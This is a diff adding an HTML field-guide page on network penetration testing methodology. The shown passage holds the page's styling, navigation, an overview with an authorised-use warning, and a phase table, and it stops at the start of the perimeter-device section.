@@ -1,0 +1,1170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Network Penetration Testing Methodology | Nisarg Chasmawala</title>
+<meta name="description" content="Network Penetration Testing Methodology — a complete field guide including AI integration by Nisarg Chasmawala (Shroff), Offensive Security Engineer.">
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --g:#00ff41;--c:#00e5ff;--p:#bf00ff;--r:#ff003c;--o:#ffd700;
+  --bg:#030509;--t1:#d4ffe0;--t2:#7aad82;--t3:#2e4a32;
+  --mono:'Share Tech Mono',monospace;--dsp:'Orbitron',sans-serif;--body:'Rajdhani',sans-serif;
+  --glow:0 0 20px rgba(0,255,65,.4),0 0 60px rgba(0,255,65,.15);
+  --cglow:0 0 20px rgba(0,229,255,.4),0 0 60px rgba(0,229,255,.1);
+  --pglow:0 0 20px rgba(191,0,255,.4),0 0 60px rgba(191,0,255,.1);
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;overflow-x:hidden}
+body{background:var(--bg);color:var(--t1);font-family:var(--body);font-size:17px;line-height:1.8;overflow-x:hidden;cursor:none}
+
+/* ── BG LAYERS ── */
+#bg-particle{position:fixed;inset:0;z-index:0;pointer-events:none}
+#bg-hex{position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.35}
+#bg-scan{position:fixed;inset:0;z-index:9999;pointer-events:none;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,65,.009) 2px,rgba(0,255,65,.009) 4px)}
+#bg-vignette{position:fixed;inset:0;z-index:1;pointer-events:none;background:radial-gradient(ellipse at 50% 50%,transparent 50%,rgba(3,5,9,.85) 100%)}
+#bg-noise{position:fixed;inset:0;z-index:2;pointer-events:none;opacity:.04;background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");background-size:200px 200px;animation:grain .4s steps(1) infinite}
+@keyframes grain{0%{transform:translate(0,0)}10%{transform:translate(-2%,-2%)}20%{transform:translate(2%,2%)}30%{transform:translate(-1%,1%)}40%{transform:translate(1%,-1%)}50%{transform:translate(-3%,1%)}60%{transform:translate(1%,3%)}70%{transform:translate(-1%,-2%)}80%{transform:translate(2%,1%)}90%{transform:translate(-2%,2%)}}
+
+/* ── CURSOR ── */
+#cur{position:fixed;width:10px;height:10px;border-radius:50%;background:var(--g);box-shadow:var(--glow);pointer-events:none;z-index:99999;transform:translate(-50%,-50%);transition:width .1s,height .1s}
+#cur2{position:fixed;width:30px;height:30px;border-radius:50%;border:1px solid rgba(0,255,65,.5);pointer-events:none;z-index:99998;transform:translate(-50%,-50%);transition:left .08s,top .08s}
+#cur3{position:fixed;width:50px;height:50px;border-radius:50%;border:1px solid rgba(0,255,65,.2);pointer-events:none;z-index:99997;transform:translate(-50%,-50%);transition:left .15s,top .15s}
+
+/* ── PROGRESS ── */
+#prog{position:fixed;top:0;left:0;height:2px;background:linear-gradient(to right,var(--g),var(--c),var(--p));box-shadow:0 0 10px var(--g);z-index:10000;width:0%}
+
+/* ── TOPBAR ── */
+.topbar{position:fixed;top:0;left:0;right:0;height:58px;background:rgba(3,5,9,.88);border-bottom:1px solid rgba(0,255,65,.12);backdrop-filter:blur(20px) saturate(1.5);z-index:1000;display:flex;align-items:center;justify-content:space-between;padding:0 32px}
+.tb-left{display:flex;flex-direction:column;gap:2px}
+.tb-name{font-family:var(--dsp);font-size:13px;font-weight:900;color:var(--t1);letter-spacing:3px;text-shadow:0 0 20px rgba(255,255,255,.2)}
+.tb-roles{font-family:var(--mono);font-size:9px;letter-spacing:1.5px;overflow:hidden;white-space:nowrap}
+.tb-inner{display:inline-block;color:var(--c);animation:ticker 18s linear infinite}
+@keyframes ticker{0%{transform:translateX(100%)}100%{transform:translateX(-100%)}}
+.tb-status{display:flex;align-items:center;gap:8px;font-family:var(--mono);font-size:11px;color:var(--g)}
+.tb-dot{width:7px;height:7px;border-radius:50%;background:var(--g);box-shadow:0 0 10px var(--g);animation:tdot 1.2s ease-in-out infinite}
+@keyframes tdot{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.3;transform:scale(.7)}}
+
+/* ── TOC ── */
+.toc{position:fixed;right:20px;top:50%;transform:translateY(-50%);z-index:200;display:flex;flex-direction:column;gap:9px}
+.toc-i{display:flex;align-items:center;gap:8px;cursor:pointer}
+.toc-d{width:6px;height:6px;border-radius:50%;border:1px solid var(--t3);transition:all .25s;flex-shrink:0}
+.toc-i.active .toc-d,.toc-i:hover .toc-d{background:var(--g);border-color:var(--g);box-shadow:0 0 10px var(--g)}
+.toc-l{font-family:var(--mono);font-size:10px;color:var(--t3);opacity:0;transform:translateX(6px);transition:all .2s;white-space:nowrap}
+.toc-i:hover .toc-l,.toc-i.active .toc-l{opacity:1;transform:none;color:var(--g)}
+@media(max-width:1000px){.toc{display:none}}
+
+/* ── WRAPPER ── */
+.wrap{position:relative;z-index:10;max-width:980px;margin:0 auto;padding:0 28px}
+
+/* ── HERO ── */
+.hero{min-height:100vh;display:flex;flex-direction:column;justify-content:center;padding:100px 0 60px;position:relative}
+.hero-canvas-wrap{position:absolute;right:-80px;top:50%;transform:translateY(-52%);width:500px;height:500px;pointer-events:none}
+#hero-geo{width:100%;height:100%}
+.hero-tag{font-family:var(--mono);font-size:11px;letter-spacing:4px;color:var(--c);text-transform:uppercase;margin-bottom:18px;opacity:0;animation:fup .6s ease forwards .3s;display:flex;align-items:center;gap:12px}
+.hero-tag::before{content:'';width:40px;height:1px;background:linear-gradient(to right,transparent,var(--c))}
+.hero-tag::after{content:'';flex:1;max-width:100px;height:1px;background:linear-gradient(to right,var(--c),transparent)}
+.hero-title{font-family:var(--dsp);font-size:clamp(24px,4.3vw,52px);font-weight:900;line-height:1.0;letter-spacing:2px;text-transform:uppercase;margin-bottom:8px;opacity:0;animation:fup .7s ease forwards .5s}
+.ht-line1{display:block;color:var(--g);text-shadow:0 0 40px rgba(0,255,65,.6),0 0 100px rgba(0,255,65,.25),0 4px 0 rgba(0,200,50,.3)}
+.ht-sub{display:block;font-size:.43em;letter-spacing:6px;color:rgba(200,255,220,.5);font-weight:400;margin-top:10px}
+.gw{position:relative;display:inline-block}
+.gw::before,.gw::after{content:attr(data-t);position:absolute;top:0;left:0;width:100%;font-family:var(--dsp);font-weight:900;font-size:inherit;letter-spacing:inherit;text-transform:uppercase}
+.gw::before{color:var(--c);animation:ga 5s infinite;clip-path:polygon(0 0,100% 0,100% 33%,0 33%)}
+.gw::after{color:var(--r);animation:gb 5s infinite;clip-path:polygon(0 66%,100% 66%,100% 100%,0 100%)}
+@keyframes ga{0%,85%,100%{transform:none;opacity:0}87%{transform:translate(-5px,2px);opacity:.9}89%{transform:translate(5px,-2px);opacity:.7}91%{transform:translate(-3px,1px);opacity:.85}93%{transform:none;opacity:0}}
+@keyframes gb{0%,87%,100%{transform:none;opacity:0}89%{transform:translate(5px,3px);opacity:.8}91%{transform:translate(-5px,-2px);opacity:.6}93%{transform:translate(3px,1px);opacity:.75}95%{transform:none;opacity:0}}
+.hero-desc{font-size:17px;font-weight:300;color:var(--t2);max-width:560px;line-height:1.75;margin-bottom:36px;opacity:0;animation:fup .8s ease forwards .8s;margin-top:20px}
+.hero-meta{display:flex;gap:24px;flex-wrap:wrap;opacity:0;animation:fup .8s ease forwards 1s}
+.m-item{display:flex;flex-direction:column;gap:3px}
+.m-lbl{font-family:var(--mono);font-size:9px;letter-spacing:3px;color:var(--t3);text-transform:uppercase}
+.m-val{font-family:var(--mono);font-size:12px;color:var(--c)}
+.hero-scroll-hint{position:absolute;bottom:24px;left:0;display:flex;align-items:center;gap:12px;opacity:0;animation:fin 1s ease forwards 1.8s}
+.hs-line{width:60px;height:1px;background:linear-gradient(to right,var(--g),transparent)}
+.hs-txt{font-family:var(--mono);font-size:9px;letter-spacing:3px;color:var(--t3)}
+.hs-pulse{width:6px;height:6px;border-radius:50%;background:var(--g);box-shadow:0 0 8px var(--g);animation:tdot 1.5s ease-in-out infinite}
+
+/* ── SECTIONS ── */
+.sec{margin-bottom:100px}
+.sec-hd{display:flex;align-items:center;gap:14px;margin-bottom:40px}
+.sec-n{font-family:var(--mono);font-size:10px;color:var(--p);letter-spacing:2px;min-width:44px}
+.sec-ln{flex:1;height:1px;background:linear-gradient(to right,rgba(0,229,255,.35),transparent)}
+.sec-t{font-family:var(--dsp);font-size:clamp(14px,2.5vw,21px);font-weight:700;letter-spacing:3px;text-transform:uppercase;color:var(--c);text-shadow:var(--cglow)}
+.tw-cursor{display:inline-block;width:2px;height:1em;background:var(--c);margin-left:4px;animation:blink 1s step-end infinite;vertical-align:middle}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+
+/* ── AI SECTION SPECIAL COLOUR ── */
+.sec-ai .sec-t{color:var(--p);text-shadow:var(--pglow)}
+.sec-ai .sec-n{color:var(--c)}
+.sec-ai .sec-ln{background:linear-gradient(to right,rgba(191,0,255,.35),transparent)}
+.sec-ai .tw-cursor{background:var(--p)}
+
+/* ── PANELS ── */
+.panel{background:rgba(0,255,65,.025);border:1px solid rgba(0,255,65,.12);border-radius:4px;padding:32px;margin-bottom:22px;position:relative;overflow:hidden;transition:border-color .3s,box-shadow .3s,transform .3s;transform-style:preserve-3d}
+.panel::before{content:'';position:absolute;top:0;left:0;width:3px;height:100%;background:linear-gradient(to bottom,var(--g),transparent);opacity:0;transition:opacity .3s}
+.panel::after{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(255,255,255,.015) 0%,transparent 60%);pointer-events:none}
+.panel:hover{border-color:rgba(0,229,255,.4);box-shadow:0 0 50px rgba(0,229,255,.07),inset 0 0 40px rgba(0,229,255,.025),0 20px 60px rgba(0,0,0,.3);transform:translateY(-3px) translateZ(6px)}
+.panel:hover::before{opacity:1}
+.panel p{color:var(--t2);margin-bottom:12px}
+.panel p:last-child{margin-bottom:0}
+.panel-t{font-family:var(--dsp);font-size:12px;font-weight:700;letter-spacing:3px;color:var(--g);text-transform:uppercase;margin-bottom:18px;display:flex;align-items:center;gap:12px}
+.panel-t::after{content:'';flex:1;height:1px;background:linear-gradient(to right,rgba(0,255,65,.2),transparent)}
+.panel-ai{background:rgba(191,0,255,.03);border-color:rgba(191,0,255,.18)}
+.panel-ai:hover{border-color:rgba(191,0,255,.45);box-shadow:0 0 50px rgba(191,0,255,.07),inset 0 0 40px rgba(191,0,255,.025),0 20px 60px rgba(0,0,0,.3)}
+.panel-ai .panel-t{color:var(--p)}
+.panel-ai .panel-t::after{background:linear-gradient(to right,rgba(191,0,255,.2),transparent)}
+.panel-ai::before{background:linear-gradient(to bottom,var(--p),transparent)}
+
+/* ── VULN / DEVICE CARDS (purple tilt) ── */
+.vgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(275px,1fr));gap:18px;margin-bottom:28px;perspective:1200px}
+.vc{background:rgba(191,0,255,.03);border:1px solid rgba(191,0,255,.15);border-radius:4px;padding:24px;position:relative;overflow:hidden;cursor:default;transform-style:preserve-3d;transition:box-shadow .25s;will-change:transform}
+.vc::before{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(255,255,255,.04) 0%,transparent 50%);opacity:0;transition:opacity .25s}
+.vc::after{content:'';position:absolute;top:0;right:0;width:0;height:0;border-top:32px solid rgba(191,0,255,.25);border-left:32px solid transparent}
+.vc:hover::before{opacity:1}
+.vcn{font-family:var(--mono);font-size:44px;color:rgba(191,0,255,.09);position:absolute;top:6px;right:12px;line-height:1}
+.vcname{font-family:var(--dsp);font-size:11px;font-weight:700;letter-spacing:2px;color:var(--p);text-transform:uppercase;margin-bottom:10px}
+.vcdesc{font-size:14px;color:var(--t2);line-height:1.65;font-weight:300}
+.sev{display:inline-block;margin-top:12px;font-family:var(--mono);font-size:9px;letter-spacing:2px;padding:3px 10px;border-radius:2px;text-transform:uppercase}
+.sc{background:rgba(255,0,60,.1);color:var(--r);border:1px solid rgba(255,0,60,.28)}
+.sh{background:rgba(255,148,0,.08);color:#ff9400;border:1px solid rgba(255,148,0,.25)}
+.sm{background:rgba(255,215,0,.08);color:var(--o);border:1px solid rgba(255,215,0,.22)}
+
+/* ── AI CAPABILITY CARDS ── */
+.ai-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(270px,1fr));gap:16px;margin:20px 0;perspective:1000px}
+.ai-card{background:rgba(191,0,255,.04);border:1px solid rgba(191,0,255,.18);border-radius:4px;padding:22px;position:relative;overflow:hidden;transition:all .3s;transform-style:preserve-3d}
+.ai-card::before{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(191,0,255,.05),transparent);opacity:0;transition:opacity .3s}
+.ai-card::after{content:'';position:absolute;top:0;right:0;width:0;height:0;border-top:26px solid rgba(191,0,255,.25);border-left:26px solid transparent}
+.ai-card:hover{border-color:rgba(191,0,255,.5);box-shadow:var(--pglow),0 16px 40px rgba(0,0,0,.25);transform:translateY(-3px)}
+.ai-card:hover::before{opacity:1}
+.ai-card-icon{font-size:24px;margin-bottom:10px;display:block}
+.ai-card-name{font-family:var(--dsp);font-size:11px;font-weight:700;letter-spacing:2px;color:var(--p);text-transform:uppercase;margin-bottom:10px}
+.ai-card-desc{font-size:14px;color:var(--t2);line-height:1.65;font-weight:300}
+
+/* ── TOOL CARDS (cyan) ── */
+.tgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(210px,1fr));gap:14px;margin:20px 0;perspective:800px}
+.tc{background:rgba(0,229,255,.03);border:1px solid rgba(0,229,255,.1);border-radius:4px;padding:20px;transition:all .25s;position:relative;overflow:hidden;transform-style:preserve-3d}
+.tc::after{content:'';position:absolute;bottom:0;left:0;right:0;height:2px;background:linear-gradient(to right,var(--c),transparent);transform:scaleX(0);transform-origin:left;transition:transform .3s}
+.tc:hover{border-color:rgba(0,229,255,.4);background:rgba(0,229,255,.06);box-shadow:var(--cglow),0 12px 40px rgba(0,0,0,.2);transform:translateY(-3px)}
+.tc:hover::after{transform:scaleX(1)}
+.tcname{font-family:var(--mono);font-size:12px;color:var(--c);margin-bottom:5px}
+.tctag{font-family:var(--mono);font-size:9px;letter-spacing:2px;color:var(--o);text-transform:uppercase;margin-bottom:8px;display:block}
+.tcdesc{font-size:13px;color:var(--t3);line-height:1.5}
+
+/* ── PHASE CARDS (red) ── */
+.atk{background:rgba(255,0,60,.03);border:1px solid rgba(255,0,60,.12);border-radius:4px;padding:28px;margin-bottom:24px;position:relative;overflow:hidden;transition:all .3s;transform-style:preserve-3d}
+.atk::before{content:'';position:absolute;top:0;right:0;width:0;height:0;border-top:32px solid rgba(255,0,60,.25);border-left:32px solid transparent}
+.atk::after{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(255,0,60,.03),transparent);opacity:0;transition:opacity .3s;pointer-events:none}
+.atk:hover{border-color:rgba(255,0,60,.4);box-shadow:0 0 60px rgba(255,0,60,.05),0 20px 60px rgba(0,0,0,.3);transform:translateY(-3px)}
+.atk:hover::after{opacity:1}
+.atk-name{font-family:var(--dsp);font-size:12px;font-weight:700;letter-spacing:3px;color:var(--r);text-transform:uppercase;margin-bottom:14px}
+.atk-body{color:var(--t2);font-size:15px;margin-bottom:16px;line-height:1.75}
+
+/* ── DEFENCE / MITIGATION CARDS ── */
+.mgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(255px,1fr));gap:16px;margin:20px 0}
+.mcard{background:rgba(0,229,255,.03);border:1px solid rgba(0,229,255,.12);border-radius:4px;padding:22px;transition:all .25s;position:relative;overflow:hidden}
+.mcard::after{content:'';position:absolute;top:0;right:0;width:0;height:0;border-top:26px solid rgba(0,229,255,.2);border-left:26px solid transparent}
+.mcard:hover{border-color:rgba(0,229,255,.4);box-shadow:var(--cglow),0 16px 40px rgba(0,0,0,.2);transform:translateY(-3px)}
+.mcard-name{font-family:var(--dsp);font-size:11px;font-weight:700;letter-spacing:2px;color:var(--c);text-transform:uppercase;margin-bottom:10px}
+.mcard-desc{font-size:14px;color:var(--t2);line-height:1.65;font-weight:300}
+
+/* ── PORT TABLE ── */
+.ptbl{width:100%;border-collapse:collapse;font-family:var(--mono);font-size:12px;margin:16px 0}
+.ptbl th{text-align:left;padding:11px 14px;color:var(--c);border-bottom:1px solid rgba(0,229,255,.3);letter-spacing:2px;font-size:10px;text-transform:uppercase}
+.ptbl td{padding:10px 14px;color:var(--t2);border-bottom:1px solid rgba(0,255,65,.05);vertical-align:top}
+.ptbl tr:hover td{background:rgba(0,255,65,.02)}
+.ptbl td:first-child{color:var(--g);font-weight:700}
+.ptbl td:nth-child(2){color:var(--o)}
+
+/* ── CHECKLIST ── */
+.chk{list-style:none}
+.chk li{display:flex;align-items:flex-start;gap:12px;padding:11px 0;border-bottom:1px solid rgba(0,255,65,.05);font-size:14px;color:var(--t2);line-height:1.6}
+.chk li:last-child{border-bottom:none}
+.chk-i{flex-shrink:0;width:18px;height:18px;border:1px solid var(--g);border-radius:2px;display:flex;align-items:center;justify-content:center;margin-top:2px;background:rgba(0,255,65,.05)}
+.chk-i::after{content:'✓';font-size:10px;color:var(--g);font-family:var(--mono)}
+.chk li strong{color:var(--t1);font-weight:600}
+
+/* ── 3-COL DEFENCE ── */
+.dgrid{display:grid;grid-template-columns:repeat(3,1fr);gap:18px;margin-bottom:22px}
+@media(max-width:740px){.dgrid{grid-template-columns:1fr}}
+
+/* ── CODE BLOCKS ── */
+.cb{background:rgba(0,0,0,.7);border:1px solid rgba(0,255,65,.1);border-left:3px solid var(--g);border-radius:0 4px 4px 0;padding:22px 26px;margin:16px 0;position:relative;overflow-x:auto;transition:all .3s;cursor:pointer}
+.cb::before{content:attr(data-l);position:absolute;top:0;right:0;font-family:var(--mono);font-size:9px;letter-spacing:2px;color:var(--g);background:rgba(0,255,65,.07);padding:3px 12px;border-bottom-left-radius:4px;text-transform:uppercase}
+.cb::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;background:linear-gradient(to right,var(--g),transparent);opacity:0;transition:opacity .3s}
+.cb:hover{border-color:rgba(0,255,65,.35);box-shadow:0 0 30px rgba(0,255,65,.04)}
+.cb:hover::after{opacity:.5}
+.cb.cb-ai{border-left-color:var(--p)}
+.cb.cb-ai::before{color:var(--p);background:rgba(191,0,255,.07)}
+.cb code{font-family:var(--mono);font-size:13px;color:var(--g);white-space:pre;display:block;line-height:1.9}
+.cmd{color:var(--c)}.flag{color:var(--o)}.cmt{color:var(--t3)}.str{color:#ff79c6}.prm{color:#bd93f9}.kw{color:var(--r)}.fn{color:#8be9fd}.ai-c{color:var(--p)}
+
+/* ── ALERTS ── */
+.alert{border-radius:4px;padding:16px 20px;margin:20px 0;display:flex;gap:14px;align-items:flex-start}
+.al-w{background:rgba(255,215,0,.04);border:1px solid rgba(255,215,0,.18);border-left:3px solid var(--o)}
+.al-i{background:rgba(0,229,255,.04);border:1px solid rgba(0,229,255,.14);border-left:3px solid var(--c)}
+.al-p{background:rgba(191,0,255,.04);border:1px solid rgba(191,0,255,.18);border-left:3px solid var(--p)}
+.al-ic{font-family:var(--mono);font-size:13px;flex-shrink:0;margin-top:2px}
+.al-w .al-ic{color:var(--o)}.al-i .al-ic{color:var(--c)}.al-p .al-ic{color:var(--p)}
+.al-tx{font-size:14px;color:var(--t2);line-height:1.6}
+
+/* ── CTA ── */
+.cta{background:linear-gradient(135deg,rgba(0,255,65,.04),rgba(191,0,255,.04));border:1px solid rgba(0,229,255,.3);border-radius:4px;padding:60px 50px;text-align:center;position:relative;overflow:hidden;margin-top:80px}
+.cta::before{content:'NET';position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-family:var(--dsp);font-size:200px;font-weight:900;color:rgba(0,255,65,.018);pointer-events:none;white-space:nowrap;letter-spacing:30px}
+.cta-t{font-family:var(--dsp);font-size:20px;font-weight:700;letter-spacing:4px;color:var(--g);text-transform:uppercase;margin-bottom:16px;text-shadow:var(--glow)}
+.cta-p{color:var(--t2);font-size:16px;max-width:540px;margin:0 auto 32px;line-height:1.75}
+.cta-btns{display:flex;gap:16px;justify-content:center;flex-wrap:wrap}
+.btn{font-family:var(--mono);font-size:11px;letter-spacing:3px;text-transform:uppercase;padding:13px 30px;border-radius:2px;text-decoration:none;display:inline-block;transition:all .25s}
+.btn-p{border:1px solid var(--g);color:var(--g);background:rgba(0,255,65,.06)}
+.btn-p:hover{background:var(--g);color:var(--bg);box-shadow:var(--glow)}
+.btn-s{border:1px solid var(--c);color:var(--c);background:rgba(0,229,255,.05)}
+.btn-s:hover{background:var(--c);color:var(--bg);box-shadow:var(--cglow)}
+
+/* ── FOOTER ── */
+.footer{border-top:1px solid rgba(0,255,65,.1);padding:32px 0;margin-top:60px;display:flex;align-items:flex-start;justify-content:space-between;flex-wrap:wrap;gap:20px}
+.f-l{font-family:var(--mono);font-size:11px;color:var(--t3);letter-spacing:1.5px;line-height:2}
+.f-alias{color:var(--g);font-size:10px;letter-spacing:3px;text-shadow:0 0 8px var(--g)}
+.f-r{font-family:var(--mono);font-size:11px;color:var(--t3);text-align:right;line-height:2}
+.f-r a{color:var(--g);text-decoration:none;transition:text-shadow .2s}
+.f-r a:hover{text-shadow:var(--glow)}
+
+/* ── DIVIDER ── */
+.div{height:1px;background:linear-gradient(to right,transparent,rgba(0,255,65,.15),transparent);margin:60px 0;position:relative}
+.div::after{content:'';position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:6px;height:6px;border-radius:50%;background:var(--g);box-shadow:0 0 12px var(--g)}
+.div-ai{background:linear-gradient(to right,transparent,rgba(191,0,255,.2),transparent)}
+.div-ai::after{background:var(--p);box-shadow:0 0 12px var(--p)}
+
+/* ── ANIMATIONS ── */
+@keyframes fup{from{opacity:0;transform:translateY(24px)}to{opacity:1;transform:none}}
+@keyframes fin{from{opacity:0}to{opacity:1}}
+.rv{opacity:0;transform:translateY(30px);transition:opacity .8s,transform .8s}
+.rv-l{opacity:0;transform:translateX(-30px);transition:opacity .8s,transform .8s}
+.rv.on,.rv-l.on{opacity:1;transform:none}
+
+/* ── RESPONSIVE ── */
+@media(max-width:700px){.vgrid,.tgrid,.mgrid,.ai-grid{grid-template-columns:1fr}.hero-canvas-wrap{display:none}.cta{padding:36px 20px}.cta::before{font-size:80px}}
+</style>
+</head>
+<body>
+
+<canvas id="bg-particle"></canvas>
+<canvas id="bg-hex"></canvas>
+<div id="bg-vignette"></div>
+<div id="bg-noise"></div>
+<div id="bg-scan"></div>
+<div id="cur"></div><div id="cur2"></div><div id="cur3"></div>
+<div id="prog"></div>
+
+<!-- ══ TOPBAR ══ -->
+<nav class="topbar">
+  <div class="tb-left">
+    <span class="tb-name">NISARG CHASMAWALA (SHROFF)</span>
+    <div class="tb-roles">
+      <span class="tb-inner">
+        Penetration Tester &nbsp;|&nbsp; Vulnerability Assessment &nbsp;|&nbsp;
+        Cybersecurity Researcher &nbsp;|&nbsp; Offensive Security Engineer &nbsp;|&nbsp;
+        Digital Forensics &nbsp;|&nbsp; Penetration Tester &nbsp;|&nbsp; Vulnerability Assessment &nbsp;|&nbsp;
+        Cybersecurity Researcher &nbsp;|&nbsp; Offensive Security Engineer &nbsp;|&nbsp; Digital Forensics
+      </span>
+    </div>
+  </div>
+  <div class="tb-status"><span class="tb-dot"></span>SYS ONLINE</div>
+</nav>
+
+<!-- ══ TOC ══ -->
+<nav class="toc" id="toc">
+  <div class="toc-i active" onclick="goTo('#hero')" data-s="hero"><div class="toc-d"></div><span class="toc-l">INTRO</span></div>
+  <div class="toc-i" onclick="goTo('#what')" data-s="what"><div class="toc-d"></div><span class="toc-l">OVERVIEW</span></div>
+  <div class="toc-i" onclick="goTo('#perimeter')" data-s="perimeter"><div class="toc-d"></div><span class="toc-l">PERIMETER</span></div>
+  <div class="toc-i" onclick="goTo('#recon')" data-s="recon"><div class="toc-d"></div><span class="toc-l">PHASE I — RECON</span></div>
+  <div class="toc-i" onclick="goTo('#scan')" data-s="scan"><div class="toc-d"></div><span class="toc-l">PHASE II — SCAN</span></div>
+  <div class="toc-i" onclick="goTo('#exploit')" data-s="exploit"><div class="toc-d"></div><span class="toc-l">PHASE III — EXPLOIT</span></div>
+  <div class="toc-i" onclick="goTo('#pivot')" data-s="pivot"><div class="toc-d"></div><span class="toc-l">PHASE IV — PIVOT</span></div>
+  <div class="toc-i" onclick="goTo('#exfil')" data-s="exfil"><div class="toc-d"></div><span class="toc-l">PHASE V — EXFIL</span></div>
+  <div class="toc-i" onclick="goTo('#ai')" data-s="ai"><div class="toc-d"></div><span class="toc-l">AI INTEGRATION</span></div>
+  <div class="toc-i" onclick="goTo('#defence')" data-s="defence"><div class="toc-d"></div><span class="toc-l">DEFENCE</span></div>
+</nav>
+
+<div class="wrap">
+
+<!-- ══════════════════════════════════ HERO ══════════════════════════════════ -->
+<section class="hero" id="hero">
+  <div class="hero-canvas-wrap"><canvas id="hero-geo"></canvas></div>
+
+  <div class="hero-tag">NISARG CHASMAWALA &nbsp;//&nbsp; ALIAS: HEAVEN</div>
+
+  <h1 class="hero-title">
+    <div class="gw" data-t="NETWORK PEN TEST">
+      <span class="ht-line1">NETWORK PEN TEST</span>
+    </div>
+    <span class="ht-sub">METHODOLOGY + AI INTEGRATION — FIELD GUIDE</span>
+  </h1>
+
+  <p class="hero-desc">
+    A comprehensive network penetration testing methodology covering perimeter device assessment, 
+    reconnaissance, scanning, exploitation of firewalls, routers, VPNs and IDS/IPS, lateral 
+    movement, and data exfiltration — plus a dedicated deep dive into how Artificial Intelligence 
+    is transforming both offensive and defensive network security operations.
+  </p>
+
+  <div class="hero-meta">
+    <div class="m-item"><span class="m-lbl">Author</span><span class="m-val">Nisarg Chasmawala (Shroff)</span></div>
+    <div class="m-item"><span class="m-lbl">Alias</span><span class="m-val">HEAVEN</span></div>
+    <div class="m-item"><span class="m-lbl">Category</span><span class="m-val">Network Security · AI · Red Team</span></div>
+    <div class="m-item"><span class="m-lbl">Level</span><span class="m-val">Intermediate → Advanced</span></div>
+  </div>
+
+  <div class="hero-scroll-hint">
+    <div class="hs-line"></div>
+    <span class="hs-txt">SCROLL TO BEGIN</span>
+    <div class="hs-pulse"></div>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- ══════════════════════════════════
+     01 — OVERVIEW
+══════════════════════════════════ -->
+<section class="sec rv" id="what">
+  <div class="sec-hd">
+    <span class="sec-n">01 //</span>
+    <h2 class="sec-t">Network Penetration Testing Overview<span class="tw-cursor"></span></h2>
+    <div class="sec-ln"></div>
+  </div>
+
+  <div class="panel rv-l">
+    <p>Network penetration testing is the structured simulation of real-world attacks against an organisation's network infrastructure — the routers, firewalls, switches, VPN gateways, load balancers, and intrusion detection systems that form the perimeter separating internal assets from the hostile internet. While endpoint and application security receives significant investment, perimeter devices remain chronically under-tested and frequently misconfigured.</p>
+    <p>A compromised perimeter device is not a partial breach — it is a complete one. An attacker who controls a border firewall controls the traffic rules, the logging, and often has a direct path into every internal subnet behind it. Perimeter penetration testing identifies these weaknesses before adversaries do, providing organisations with the evidence needed to justify hardening investments and prioritise remediation.</p>
+  </div>
+
+  <div class="alert al-w rv">
+    <span class="al-ic">[ ⚠ ]</span>
+    <p class="al-tx"><strong>Authorised Use Only.</strong> All techniques in this guide must be conducted under explicit written authorisation from the network owner. Network penetration testing without permission is illegal under the Computer Misuse Act, CFAA, and equivalent legislation. Always define scope, obtain written approval, and confirm rules of engagement before any active testing begins.</p>
+  </div>
+
+  <div class="panel rv">
+    <div class="panel-t">Methodology Phases at a Glance</div>
+    <table class="ptbl">
+      <thead><tr><th>Phase</th><th>Objective</th><th>Primary Deliverable</th></tr></thead>
+      <tbody>
+        <tr><td>I — Reconnaissance</td><td>Map the external attack surface passively and actively</td><td>Target inventory, open ports, service versions, banner data</td></tr>
+        <tr><td>II — Scanning &amp; Enumeration</td><td>Identify vulnerabilities in perimeter services</td><td>Vulnerability list with CVSSv3 scores</td></tr>
+        <tr><td>III — Exploitation</td><td>Validate vulnerabilities with controlled proof-of-concept</td><td>Working exploits, screenshots, access evidence</td></tr>
+        <tr><td>IV — Privilege Escalation &amp; Pivot</td><td>Escalate privileges and move into internal networks</td><td>Lateral movement paths, internal network map</td></tr>
+        <tr><td>V — Data Exfiltration</td><td>Demonstrate data extraction capabilities</td><td>Exfiltrated configuration data, credentials (test only)</td></tr>
+        <tr><td>VI — Reporting</td><td>Document all findings with risk ratings and remediation steps</td><td>Full penetration testing report</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- ══════════════════════════════════
+     02 — PERIMETER DEVICES
+══════════════════════════════════ -->
+<section class="sec rv" id="perimeter">
+  <div class="sec-hd">
+    <span class="sec-n">02 //</span>
+    <h2 class="sec-t">Understanding the Perimeter Attack Surface<span class="tw-cursor"></span></h2>
+    <div class="sec-ln"></div>
+  </div>
+
+  <div class="panel rv-l">
+    <p>Before testing begins, every device forming the network perimeter must be catalogued. Each category has distinct vulnerability classes, default credential sets, known CVEs, and exploitation techniques. A perimeter assessment that only covers firewalls while missing VPN gateways or load balancers is fundamentally incomplete — attackers do not self-restrict to comfortable targets.</p>
+  </div>
+
+  <div class="vgrid rv">
+    <div class="vc">
+      <span class="vcn">01</span>
+      <div class="vcname">Firewalls</div>
